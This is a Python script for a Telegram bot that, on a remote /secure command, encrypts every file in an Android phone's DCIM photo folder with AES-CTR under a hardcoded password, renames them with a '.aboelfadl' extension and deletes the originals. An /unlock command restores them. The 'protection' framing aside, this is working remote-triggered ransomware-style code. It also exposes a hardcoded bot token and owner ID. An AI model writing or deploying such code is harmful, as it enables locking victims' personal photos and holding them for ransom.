import os
import sys
import telebot
import hashlib
from Crypto.Cipher import AES
from Crypto.Util import Counter

# --- إعدادات البوت ---
BOT_TOKEN = "6752223055:AAE1hbI5zx2_W3miI8IbdoqT2gMSUtmDHUA" 
OWNER_ID = 1431886140
MY_PASSWORD = "mahmoud"
CHUNK_SIZE = 64 * 1024  # حجم القطعة (64KB) للسرعة

# محاولة الاتصال
try:
    bot = telebot.TeleBot(BOT_TOKEN)
except Exception as e:
    print("❌ خطأ في التوكن")
    sys.exit()

# --- 1. محرك التشفير السريع (AES-CTR) ---
def get_key(password):
    return hashlib.sha256(password.encode()).digest()

def process_file_fast(file_path, password, mode):
    try:
        key = get_key(password)
        
        if mode == "encrypt":
            iv = os.urandom(16)
            ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            
            output_path = file_path + ".aboelfadl"
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                outfile.write(iv) # كتابة IV في البداية
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.encrypt(chunk))
            
            os.remove(file_path)

        elif mode == "decrypt":
            if not file_path.endswith(".aboelfadl"): return False
            
            output_path = file_path.replace(".aboelfadl", "")
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                iv = infile.read(16) # قراءة IV
                ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
                cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
                
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.decrypt(chunk))
            
            os.remove(file_path)

        return True
    except Exception as e:
        print(f"Error processing {file_path}: {e}")
        return False

# --- 2. معالجة المجلد ---
def process_folder_fast(folder_path, password, mode):
    if not os.path.exists(folder_path):
        return "❌ المجلد غير موجود أو لا توجد صلاحيات."
    
    action_name = "تشفير" if mode == "encrypt" else "فك تشفير"
    bot.send_message(OWNER_ID, f"⚡ جاري {action_name} الملفات بأقصى سرعة...")
    
    count = 0
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            
            if mode == "encrypt" and not file.endswith(".aboelfadl"):
                if process_file_fast(file_path, password, "encrypt"):
                    count += 1
            
            elif mode == "decrypt" and file.endswith(".aboelfadl"):
                if process_file_fast(file_path, password, "decrypt"):
                    count += 1
    
    return f"✅ تمت العملية بنجاح!\n📂 عدد الملفات: {count}"

# --- 3. أوامر البوت ---
@bot.message_handler(commands=['secure'])
def cmd_encrypt(message):
    if message.from_user.id == OWNER_ID:
        # مسار الأندرويد (تأكد منه)
        path = "/storage/emulated/0/DCIM"
        res = process_folder_fast(path, MY_PASSWORD, mode="encrypt") 
        bot.send_message(OWNER_ID, res)

@bot.message_handler(commands=['unlock'])
def cmd_decrypt(message):
    if message.from_user.id == OWNER_ID:
        path = "/storage/emulated/0/DCIM"
        res = process_folder_fast(path, MY_PASSWORD, mode="decrypt") 
        bot.send_message(OWNER_ID, res)

# --- 4. رسالة الترحيب عند التشغيل ---
def send_welcome_msg():
    welcome_text = (
        "🟢 *تم تشغيل بوت AboElfadl Turbo بنجاح!*\n\n"
        "النظام جاهز الآن ويعمل بوضع السرعة القصوى.\n"
        "👇 *قائمة الأوامر المتاحة:*\n\n"
        "🔒 /secure  : لتشفير مجلد الصور (DCIM) وحمايته.\n"
        "🔓 /unlock  : لفك التشفير واستعادة الملفات.\n\n"
        "⚠️ *تنبيه:* احتفظ بكلمة السر ولا تحذف البوت أثناء العمل."
    )
    try:
        bot.send_message(OWNER_ID, welcome_text, parse_mode="Markdown")
        print("✅ تم إرسال رسالة الترحيب للمالك.")
    except Exception as e:
        print(f"❌ لم يتم إرسال الرسالة: {e}")

# التشغيل
if __name__ == "__main__":
    print("🚀 Turbo Bot Started...")
    send_welcome_msg() # إرسال الرسالة فوراً
    bot.infinity_polling()